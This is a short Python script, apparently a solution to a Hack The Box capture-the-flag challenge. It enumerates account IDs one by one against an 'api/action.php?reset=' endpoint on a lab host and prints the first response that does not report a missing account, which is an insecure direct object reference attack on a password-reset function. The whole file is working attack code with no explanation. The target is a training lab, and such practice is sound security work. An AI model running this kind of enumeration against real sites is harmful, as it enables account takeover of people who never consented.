#!/usr/bin/env python

import requests

host, port = 'docker.hackthebox.eu', 30000

id = 1
while True:
	#print(id)
	r = requests.get('http://{}:{}/api/action.php?reset={}'.format(
		host, port, id))
	if not 'Error: Account ID not found' in r.text:
		#print("Found valid ID: {}".format(id))
		print(r.text)
		break
	id += 1